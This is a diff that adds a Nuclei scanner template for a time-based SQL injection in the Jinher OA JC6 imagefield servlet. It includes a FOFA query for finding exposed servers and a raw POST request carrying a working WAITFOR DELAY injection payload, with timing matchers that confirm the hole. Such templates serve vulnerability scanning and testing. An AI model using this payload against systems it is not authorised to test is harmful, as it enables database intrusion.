@@ -1,0 +1,36 @@
+id: jinher-oa-jc6-imagefield-sqli
+
+info:
+  name: 金和 OA jc6 imagefield - sqli
+  author: leadlife
+  severity: high
+  description: 
+  reference:
+    - todo
+  metadata:
+    veified: true
+    fofa-query: body="/jc6/platform/sys/login" || body="JHSoft.Web.AddMenu" || app="金和网络-金和OA" || "JC6金和协同管理平台"
+  tags: jinher,sqli,time,oa
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        POST /jc6/servlet/imagefield HTTP/1.1
+        Host: {{Hostname}}
+        Cache-Control: max-age=0
+        Sec-Ch-Ua: "Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"
+        Upgrade-Insecure-Requests: 1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+        Connection: close
+        Content-Type: application/x-www-form-urlencoded
+        
+        key=readimage&sImgname=filename&sTablename=FC_ATTACH&sKeyname=djbh&sKeyvalue=1';WAITFOR DELAY '0:0:6'-----
+
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
